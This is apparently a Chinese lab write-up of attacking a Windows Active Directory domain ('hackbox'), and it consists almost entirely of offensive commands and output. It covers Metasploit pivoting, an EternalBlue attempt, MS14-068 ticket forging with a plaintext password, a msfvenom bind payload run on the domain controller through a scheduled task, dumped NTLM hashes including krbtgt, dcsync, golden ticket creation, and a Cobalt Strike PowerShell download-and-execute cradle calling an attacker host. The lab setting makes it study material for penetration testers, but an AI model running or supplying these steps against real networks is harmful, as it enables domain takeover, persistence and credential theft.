+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513133723239.png" alt="image-20250513133723239" loading="lazy" decoding="async"></p>
+<h4 id="域信息收集" tabindex="-1"><a class="headerlink" href="#域信息收集" aria-hidden="true"></a> 域信息收集</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net time /domain #查看域控时间</span><br><span class="line">net view #遍历信任主机</span><br><span class="line">net view /domain #查看域</span><br><span class="line">net view /domain:hackbox</span><br><span class="line">net group /domain</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513135625840.png" alt="image-20250513135625840" loading="lazy" decoding="async"></p>
+<p><code>ipconfig</code>确认了存在两个网段<code>10.10.10.150</code>和<code>192.168.1.13</code>。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513135931643.png" alt="image-20250513135931643" loading="lazy" decoding="async"></p>
+<h4 id="终端执行信息收集命令" tabindex="-1"><a class="headerlink" href="#终端执行信息收集命令" aria-hidden="true"></a> 终端执行信息收集命令</h4>
+<p><code>ipconfig /all</code>查看信息。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513140129603.png" alt="image-20250513140129603" loading="lazy" decoding="async"></p>
+<p><code>dns 10.10.10.149</code>，<code>dns</code>一般都是与域控同一个<code>ip</code></p>
+<h4 id="获取登陆过的用户信息" tabindex="-1"><a class="headerlink" href="#获取登陆过的用户信息" aria-hidden="true"></a> 获取登陆过的用户信息</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_logged_on_users</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513140428684.png" alt="image-20250513140428684" loading="lazy" decoding="async"></p>
+<p>获取的<code>SID</code>如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SID                                            Profile Path</span><br><span class="line">---                                            ------------</span><br><span class="line">S-1-5-18                                       C:\Windows\system32\config\systemprofile</span><br><span class="line">S-1-5-19                                       C:\Windows\ServiceProfiles\LocalService</span><br><span class="line">S-1-5-20                                       C:\Windows\ServiceProfiles\NetworkService</span><br><span class="line">S-1-5-21-1443003717-4130318662-4279967973-500  C:\Users\Administrator</span><br><span class="line">S-1-5-21-2005268815-658469957-1189185684-1103  C:\Users\web</span><br><span class="line">S-1-5-21-2005268815-658469957-1189185684-500   C:\Users\Administrator.HACKBOX</span><br></pre></td></tr></table></figure>
+<h4 id="添加路由渗透dc域控" tabindex="-1"><a class="headerlink" href="#添加路由渗透dc域控" aria-hidden="true"></a> 添加路由渗透<code>DC</code>域控</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看全局路由器</span></span><br><span class="line">run get_local_subnets</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加10段的路由信息</span></span><br><span class="line">run autoroute -s 10.10.10.0/24</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看添加的路由表信息</span></span><br><span class="line">run autoroute -p</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">回退，开启代理</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513143458109.png" alt="image-20250513143458109" loading="lazy" decoding="async"></p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513143516484.png" alt="image-20250513143516484" loading="lazy" decoding="async"></p>
+<h4 id="开启代理通域控" tabindex="-1"><a class="headerlink" href="#开启代理通域控" aria-hidden="true"></a> 开启代理通域控</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用代理模块</span></span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置代理端口</span></span><br><span class="line">set SRVHOST 127.0.0.1</span><br><span class="line">set SRVPORT 1080</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看设置的情况</span></span><br><span class="line">show options</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513193150680.png" alt="image-20250513193150680" loading="lazy" decoding="async"></p>
+<p>注意本地使用的代理配置情况。我是用的是<code>proxychains4</code>，<code>Mac m</code>系列安装这个我又折腾好久😑，参考这个才给解决的，安装<code>proxychains4</code><sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>。最好还是用<code>kali</code>，没这么多麻烦。</p>
+<h4 id="nmap通过proxychains扫描域控设备" tabindex="-1"><a class="headerlink" href="#nmap通过proxychains扫描域控设备" aria-hidden="true"></a> nmap通过proxychains扫描域控设备</h4>
+<p>修改<code>proxychains</code>的配置文件，使其代理走的是<code>127.0.0.1 1080</code></p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513195812729.png" alt="image-20250513195812729" loading="lazy" decoding="async"></p>
+<p>执行命令，结果如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -A -Pn 10.10.10.149</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513195644245.png" alt="image-20250513195644245" loading="lazy" decoding="async"></p>
+<h4 id="永恒之蓝ms17-010进行溢出攻击dc失败" tabindex="-1"><a class="headerlink" href="#永恒之蓝ms17-010进行溢出攻击dc失败" aria-hidden="true"></a> 永恒之蓝ms17-010进行溢出攻击DC(失败)</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set RHOSTS 10.10.10.149</span><br><span class="line">set RPORT 445</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513200141843.png" alt="image-20250513200141843" loading="lazy" decoding="async"></p>
+<p>攻击失败。</p>
+<h4 id="ms14-068提权域控" tabindex="-1"><a class="headerlink" href="#ms14-068提权域控" aria-hidden="true"></a> ms14-068提权域控</h4>
+<h5 id="ms14-068的条件" tabindex="-1"><a class="headerlink" href="#ms14-068的条件" aria-hidden="true"></a> ms14-068的条件</h5>
+<ul>
+<li>获取域普通用户的账号密码<code>web@hackbox.com/!@#Qwe456</code></li>
+<li>获取域普通用户的<code>SID: S-1-5-21-2005268815-658469957-1189185684-1103</code></li>
+<li>服务器未打<code>KB3011780</code>补丁</li>
+<li>域控服务器的<code>10.10.10.149</code></li>
+</ul>
+<h5 id="ms14-068创建票据" tabindex="-1"><a class="headerlink" href="#ms14-068创建票据" aria-hidden="true"></a> ms14-068创建票据</h5>
+<p>上传<code>MS14-068.exe</code><sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>到执行的目录下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe456</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513210324509.png" alt="image-20250513210324509" loading="lazy" decoding="async"></p>
+<h5 id="载入kiwi清理内存票据，再导入票据" tabindex="-1"><a class="headerlink" href="#载入kiwi清理内存票据，再导入票据" aria-hidden="true"></a> 载入kiwi清理内存票据，再导入票据</h5>
+<p>载入<code>kiwi</code>，清理当前的票据，如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kerberos_ticket_purge</span><br><span class="line">kerberos_ticket_list</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513210716497.png" alt="image-20250513210716497" loading="lazy" decoding="async"></p>
+<p>导入票据票据部分。</p>
+<p>下载<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>，并上传<code>mimikatz.exe、mimidrv.sys、mimilib.dll</code>到执行命令的目录，运行<code>mimikatz.exe</code>。</p>
+<p>并执行<code>kerberos::ptc TGT_web@hackbox.com.ccache</code></p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513212954123.png" alt="image-20250513212954123" loading="lazy" decoding="async"></p>
+<p><code>exit</code>退出<code>mimikatz</code>，<code>klist</code>查看当前票据。</p>
+<p>未导入票据前去访问<code>dc</code>，如下：</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513211928318.png" alt="image-20250513211928318" loading="lazy" decoding="async"></p>
+<p>此时去访问<code>dc</code>域控，成功访问。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513213205104.png" alt="image-20250513213205104" loading="lazy" decoding="async"></p>
+<h4 id="获取dc域控制权限" tabindex="-1"><a class="headerlink" href="#获取dc域控制权限" aria-hidden="true"></a> 获取dc域控制权限</h4>
+<h5 id="生成正向载荷copy复制到域控并执行定时任务" tabindex="-1"><a class="headerlink" href="#生成正向载荷copy复制到域控并执行定时任务" aria-hidden="true"></a> 生成正向载荷,copy复制到域控,并执行定时任务</h5>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=13777 -f exe -o bind.exe</span><br></pre></td></tr></table></figure>
+<p>生成<code>bind.exe</code>，并上传至<code>web</code>站点的服务器，并复制到域控中去。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy bind.exe \\dc\C$\  # 复制文件到目标</span><br><span class="line">net time \\dc # 查询dc时间</span><br><span class="line">at \\dc 21:51:00 c:/bind.exe #增加定时任务执行</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513214855544.png" alt="image-20250513214855544" loading="lazy" decoding="async"></p>
+<h5 id="获取域控权限命令" tabindex="-1"><a class="headerlink" href="#获取域控权限命令" aria-hidden="true"></a> 获取域控权限命令</h5>
+<p>设置好定的时间，<code>msf</code>进行监听。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 10.10.10.149</span><br><span class="line">set lport 13777</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p>成功连接至域控。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513222709163.png" alt="image-20250513222709163" loading="lazy" decoding="async"></p>
+<h4 id="获取dc域控哈希明文" tabindex="-1"><a class="headerlink" href="#获取dc域控哈希明文" aria-hidden="true"></a> 获取dc域控哈希明文</h4>
+<p>迁移进程，并获哈希</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">migrate 388</span><br><span class="line">hashdump</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513223358934.png" alt="image-20250513223358934" loading="lazy" decoding="async"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2cbe963d0d877c8cc7d09c936f1c3b33:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6f60ace6accbcb76078ccc0312174e98:::</span><br><span class="line">web:1103:aad3b435b51404eeaad3b435b51404ee:086a0bb1ed4ec72250760ea531bf8074:::</span><br><span class="line"><span class="meta prompt_">DC$</span><span class="language-bash">:1000:aad3b435b51404eeaad3b435b51404ee:961b3511aef13bfc4498d1e767ee2422:::</span></span><br><span class="line"><span class="meta prompt_">WEB$</span><span class="language-bash">:1104:aad3b435b51404eeaad3b435b51404ee:2a0edff7f95894d229b63285d32fc9c7:::</span></span><br></pre></td></tr></table></figure>
+<p>使用<code>load kiwi</code>，并执行<code>creds_tspkg</code></p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513223728435.png" alt="image-20250513223728435" loading="lazy" decoding="async"></p>
+<h4 id="抓域控全部hash" tabindex="-1"><a class="headerlink" href="#抓域控全部hash" aria-hidden="true"></a> 抓域控全部hash</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513224001261.png" alt="image-20250513224001261" loading="lazy" decoding="async"></p>
+<h4 id="制作黄金票据" tabindex="-1"><a class="headerlink" href="#制作黄金票据" aria-hidden="true"></a> 制作黄金票据</h4>
+<p>考虑长期权维护，还是做一个黄金票据比较保险。</p>
+<p>制作黄金票据需要满足以下条件：</p>
+<ul>
+<li><code>krbtgt</code>的<code>hash</code></li>
+<li>本地管理员权限</li>
+<li>域的<code>SID</code>（普通用户的<code>SID</code>除去最后三位就是域的<code>SID</code>）</li>
+<li>域内任意用户的本地管理员权限</li>
+</ul>
+<h4 id="获取ntml-sid-rid" tabindex="-1"><a class="headerlink" href="#获取ntml-sid-rid" aria-hidden="true"></a> 获取ntml sid rid</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount where name=&quot;krbtgt&quot; get sid</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513224618826.png" alt="image-20250513224618826" loading="lazy" decoding="async"></p>
+<p>获取到的<code>SID: S-1-5-21-2005268815-658469957-1189185684-502</code></p>
+<h4 id="窃取域控超级管理权限" tabindex="-1"><a class="headerlink" href="#窃取域控超级管理权限" aria-hidden="true"></a> 窃取域控超级管理权限</h4>
+<p>系统权限没办法做<code>dcsync</code>所以切换域管理权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">steal_token 2092</span><br><span class="line">dcsync_ntlm krbtgt</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513224933391.png" alt="image-20250513224933391" loading="lazy" decoding="async"></p>
+<p>获取到的内容为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Account   : krbtgt</span><br><span class="line">[+] NTLM Hash : 6f60ace6accbcb76078ccc0312174e98</span><br><span class="line">[+] LM Hash   : 36588bd35fd1fe85ec5fd73a1ca6805b</span><br><span class="line">[+] SID       : S-1-5-21-2005268815-658469957-1189185684-502</span><br><span class="line">[+] RID       : 502</span><br></pre></td></tr></table></figure>
+<h4 id="生成黄金票据" tabindex="-1"><a class="headerlink" href="#生成黄金票据" aria-hidden="true"></a> 生成黄金票据</h4>
+<p>获取到的条件如下：</p>
+<p>1、<code>krbtgt</code>的<code>hash</code>：<code>6f60ace6accbcb76078ccc0312174e98</code></p>
+<p>2、本地管理员权限：已获取</p>
+<p>3、域的<code>SID</code>（普通用户的<code>SID</code>除去最后三位就是域的<code>SID</code>）：<code>S-1-5-21-2005268815-658469957-1189185684</code></p>
+<p>4、域内任意用户的本地管理员权限：已获取。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d &lt;域名&gt; -u &lt;任意用户名&gt; -s &lt;Domain SID&gt; -k &lt;krbtgt NTLM Hash&gt; -t &lt;ticket 本</span><br><span class="line">地存储路径如:/Users/x2n/Desktop/webhack123.com/krbtgt.ticket&gt;</span><br></pre></td></tr></table></figure>
+<p>根据获取的条件，进行黄金票据的生成。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d hackbox.com -u x2ntest -s S-1-5-21-2005268815-658469957-1189185684 -k 6f60ace6accbcb76078ccc0312174e98 -t /Users/x2n/Desktop/webhack123.com/krbtgt.ticket</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513230047465.png" alt="image-20250513230047465" loading="lazy" decoding="async"></p>
+<p>切换到<code>web</code>服务器，把凭据都清除掉。使用<code>kerberos_ticket_purge</code>，确保<code>dc</code>是无法访问的。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513230617747.png" alt="image-20250513230617747" loading="lazy" decoding="async"></p>
+<p>此时使用生成的票据<code>kerberos_ticket_use /Users/x2n/Desktop/webhack123.com/krbtgt.ticket</code>，成功访问到域控。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513231036926.png" alt="image-20250513231036926" loading="lazy" decoding="async"></p>
+<h3 id="cs进行内网域渗透" tabindex="-1"><a class="headerlink" href="#cs进行内网域渗透" aria-hidden="true"></a> CS进行内网域渗透</h3>
+<h4 id="建立teamserver" tabindex="-1"><a class="headerlink" href="#建立teamserver" aria-hidden="true"></a> 建立teamserver</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.1.3 4477 # 4477为密码</span><br></pre></td></tr></table></figure>
+<p>设置好监听器，监听<code>192.168.1.3</code>，监听的端口为<code>8085</code></p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512201453122.png" alt="image-20250512201453122" loading="lazy" decoding="async"></p>
+<h4 id="在web服务器上执行下载powershell恶意代码" tabindex="-1"><a class="headerlink" href="#在web服务器上执行下载powershell恶意代码" aria-hidden="true"></a> 在web服务器上执行下载powershell恶意代码</h4>
+<p>使用<code>Windows Executable</code>去生成<code>.ps1</code>文件。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512204448238.png" alt="image-20250512204448238" loading="lazy" decoding="async"></p>
+<p>再使用钓鱼攻击中的文件下载，获取下载的<code>URL</code>，为<code>http://192.168.1.3:8022/tt</code></p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512204756691.png" alt="image-20250512204756691" loading="lazy" decoding="async"></p>
+<p>进行上线。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.3:8022/tt&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512204314027.png" alt="image-20250512204314027" loading="lazy" decoding="async"></p>
+<h4 id="设置间隔时间" tabindex="-1"><a class="headerlink" href="#设置间隔时间" aria-hidden="true"></a> 设置间隔时间</h4>
+<p>设置时间间隔为0，不然会影响后面的操作。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512204952134.png" alt="image-20250512204952134" loading="lazy" decoding="async"></p>
+<h4 id="获取hash和域内信任主机" tabindex="-1"><a class="headerlink" href="#获取hash和域内信任主机" aria-hidden="true"></a> 获取hash和域内信任主机</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">net view</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512205228670.png" alt="image-20250512205228670" loading="lazy" decoding="async"></p>
+<h4 id="扫描环境内主机" tabindex="-1"><a class="headerlink" href="#扫描环境内主机" aria-hidden="true"></a> 扫描环境内主机</h4>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512205837345.png" alt="image-20250512205837345" loading="lazy" decoding="async"></p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512210232067.png" alt="image-20250512210232067" loading="lazy" decoding="async"></p>
+<p>扫描结果如下，存在主机<code>10.10.10.149</code>。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512210509148.png" alt="image-20250512210509148" loading="lazy" decoding="async"></p>
+<h4 id="利用cs集成命令进行信息收集" tabindex="-1"><a class="headerlink" href="#利用cs集成命令进行信息收集" aria-hidden="true"></a> 利用cs集成命令进行信息收集</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net computers</span><br><span class="line">net domain</span><br><span class="line">net dclist</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512211214829.png" alt="image-20250512211214829" loading="lazy" decoding="async"></p>
+<h4 id="cs-mimikatz-web服务获取明文" tabindex="-1"><a class="headerlink" href="#cs-mimikatz-web服务获取明文" aria-hidden="true"></a> cs mimikatz web服务获取明文</h4>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512211552406.png" alt="image-20250512211552406" loading="lazy" decoding="async"></p>
+<h4 id="dir访问域控dc" tabindex="-1"><a class="headerlink" href="#dir访问域控dc" aria-hidden="true"></a> dir访问域控DC</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell \\dc\c$</span><br></pre></td></tr></table></figure>
